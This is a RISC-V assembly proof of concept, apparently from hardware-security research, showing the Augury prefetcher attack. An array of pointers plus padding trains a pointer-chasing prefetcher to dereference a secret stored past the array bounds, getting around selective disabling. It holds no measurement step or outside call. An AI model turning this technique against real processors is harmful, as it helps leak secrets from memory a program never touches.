# this program is the augury poc: out of bounds prefetching for an array of pointers pattern prefetcher
# this can bypass selective disabling:
# leak secrets located after the array bounds, which are otherwise never accessed by the program

# this program contains an array with public data, and a secret is stored after the array
# the loop activates the intel dmp, reading and dereferencing data after the array bounds

# selective disabling: the program never actively accesses the secret, so selective disabling never disables the DMP here

.globl _start
.data
    .balign 16
    values: .word 10, 11, 12, 13, 14, 15, 16, 17 # the pointers in array_of_pointers will point to these values (2 cache blocks)
    array_of_pointers: .zero 32 # array of 8 pointers (2 cache blocks)
    padding: .zero 60 # 15 empty entries: intel dmp prefetches 16 entries ahead (4 cache blocks - 1 word)
    secret: .word 0x800023cf, 0, 0, 0, 0

.text
_start:

setup:
    # t0 = index, start at 0
    mv t0, x0
    # t1 = array_of_pointers base address
    la t1, array_of_pointers
    # t2 = array_of_pointers size
    li t2, 8
    # t3 = values base address
    la t3, values

# init array_of_pointers
init_loop:
    # t4 = &array_of_pointers[index]
    slli t4, t0, 2
    add t4, t1, t4

    # t5 = &values[index]
    slli t5, t0, 2
    add t5, t3, t5

    # array_of_pointers[index] = &values[index]
    sw t5, 0(t4)

    # index++
    addi t0, t0, 1

    # init_loop end: jump to init_loop if index != array_size
    bne t0, t2, init_loop

reset_index:
    # t0 = index, start at 0
    mv t0, x0

# access and dereference the 8 pointers
loop:
    .rept 32
        nop
    .endr

    # t4 = array_of_pointers[index]
    slli t4, t0, 2
    add t4, t1, t4
    lw t4, 0(t4)

    # t5 = *array_of_pointers[index]
    lw t5, 0(t4)

    # index++
    addi t0, t0, 1

    # loop end: jump to loop if index != array_size
    bne t0, t2, loop

finish:
    .rept 128
        nop
    .endr
    lui ra,0x10000
    li sp,4
    sb sp,0(ra)
    .rept 64
        nop
    .endr
